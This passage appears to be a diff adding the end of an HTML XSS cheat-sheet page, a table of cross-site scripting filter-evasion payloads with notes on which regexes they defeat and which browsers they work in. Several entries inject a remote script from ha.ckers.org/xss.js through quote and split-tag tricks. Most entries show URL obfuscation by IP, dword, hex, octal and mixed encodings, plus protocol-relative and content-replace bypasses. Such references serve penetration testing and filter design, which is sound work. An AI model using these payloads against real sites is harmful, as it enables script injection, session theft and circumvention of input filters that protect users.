+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Yet another XSS to evade the same filter:
+	/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i 
+The only thing I've seen work against this XSS attack if you still want to allow &lt;SCRIPT&gt; tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Evade Regex Filter 5</td>
+	<td width="10%"><div align="right"><input id="link90" type="button" value="[+] Expand" onClick="toggle_visibility('table90','link90');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table90" name="table90">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">And one last XSS attack (using grave accents) to evade this regex:
+	/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Filter Evasion 1</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link91" type="button" value="[+] Expand" onClick="toggle_visibility('table91','link91');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table91" name="table91">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Filter Evasion 2</td>
+	<td width="10%"><div align="right"><input id="link92" type="button" value="[+] Expand" onClick="toggle_visibility('table92','link92');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table92" name="table92">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XSS w/HTML Quote Encapsulation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant IP Encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link93" type="button" value="[+] Expand" onClick="toggle_visibility('table93','link93');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table93" name="table93">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant URL Encoding</td>
+	<td width="10%"><div align="right"><input id="link94" type="button" value="[+] Expand" onClick="toggle_visibility('table94','link94');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table94" name="table94">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Dword Encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link95" type="button" value="[+] Expand" onClick="toggle_visibility('table95','link95');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table95" name="table95">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Hex Encoding</td>
+	<td width="10%"><div align="right"><input id="link96" type="button" value="[+] Expand" onClick="toggle_visibility('table96','link96');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table96" name="table96">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).
+The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Octal Encoding</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link97" type="button" value="[+] Expand" onClick="toggle_visibility('table97','link97');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table97" name="table97">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).
+Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Mixed Encoding</td>
+	<td width="10%"><div align="right"><input id="link98" type="button" value="[+] Expand" onClick="toggle_visibility('table98','link98');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table98" name="table98">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="h
+tt	p://6&amp;#09;6.000146.0x7.147/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).
+The tabs and newlines only work if this is encapsulated with quotes.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Protocol Resolution Bypass</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link99" type="button" value="[+] Expand" onClick="toggle_visibility('table99','link99');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table99" name="table99">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).
+Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like "(ht|f)tp(s)?://" (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the "//" to "\\". You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Firefox Lookups 1</td>
+	<td width="10%"><div align="right"><input id="link100" type="button" value="[+] Expand" onClick="toggle_visibility('table100','link100');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table100" name="table100">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="//google"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's "keyword:" protocol. You can concatenate several keywords by using something like the following "keyword:XSS+RSnake"</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Firefox Lookups 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link101" type="button" value="[+] Expand" onClick="toggle_visibility('table101','link101');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table101" name="table101">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the "feeling lucky" function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Firefox Lookups 3</td>
+	<td width="10%"><div align="right"><input id="link102" type="button" value="[+] Expand" onClick="toggle_visibility('table102','link102');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table102" name="table102">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the "feeling lucky" function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case "google").</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Removing Cnames</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link103" type="button" value="[+] Expand" onClick="toggle_visibility('table103','link103');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table103" name="table103">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).
+When combined with the above URL, removing "www." will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Extra dot for Absolute DNS</td>
+	<td width="10%"><div align="right"><input id="link104" type="button" value="[+] Expand" onClick="toggle_visibility('table104','link104');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table104" name="table104">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant JavaScript Link Location</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link105" type="button" value="[+] Expand" onClick="toggle_visibility('table105','link105');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table105" name="table105">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL string evasion (assuming "http://www.google.com/" is programmatically disallowed)
+JavaScript link location</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Content Replace</td>
+	<td width="10%"><div align="right"><input id="link106" type="button" value="[+] Expand" onClick="toggle_visibility('table106','link106');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table106" name="table106">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">URL Obfuscation</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;A HREF="http://www.gohttp://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Content replace as an attack vector (assuming "http://www.google.com/" is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector ("java&amp;#x26;#x09;script:" was converted into "java&amp;#x09;script:".</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+</body>
+</html>
